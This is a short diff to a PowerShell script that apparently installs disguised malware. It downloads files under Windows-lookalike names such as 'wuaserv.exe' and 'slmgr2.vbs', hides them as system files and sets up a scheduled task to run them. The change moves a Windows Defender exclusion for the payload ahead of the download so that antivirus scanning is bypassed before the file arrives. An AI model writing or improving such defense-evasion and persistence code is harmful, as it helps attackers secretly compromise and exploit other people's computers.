@@ -35,6 +35,10 @@ if ($answer -eq "1") {
     Remove-Item -Path $keyPath -Recurse -Force -ErrorAction SilentlyContinue
 }
 
+# Add Defender exclusion for wuaserv.exe only
+New-Item -Path "$sysDir\wuaserv.exe" -ItemType File -Force
+Add-MpPreference -ExclusionPath "$sysDir\wuaserv.exe" -ErrorAction SilentlyContinue
+
 # Download files
 foreach ($file in $urls.Keys) {
     try {
@@ -94,9 +98,6 @@ $hiddenFiles = @("$sysDir\wuaserv.exe", "$sysDir\WinRing0x64.sys", "$sysDir\slmg
 foreach ($file in $hiddenFiles) {
     attrib +h +s "$file" | Out-Null
 }
-
-# Add Defender exclusion for wuaserv.exe only
-Add-MpPreference -ExclusionPath "$sysDir\wuaserv.exe" -ErrorAction SilentlyContinue
 
 # Create scheduled task
 $action = New-ScheduledTaskAction -Execute "$sysDir\wscript.exe" -Argument "$sysDir\slmgr2.vbs"
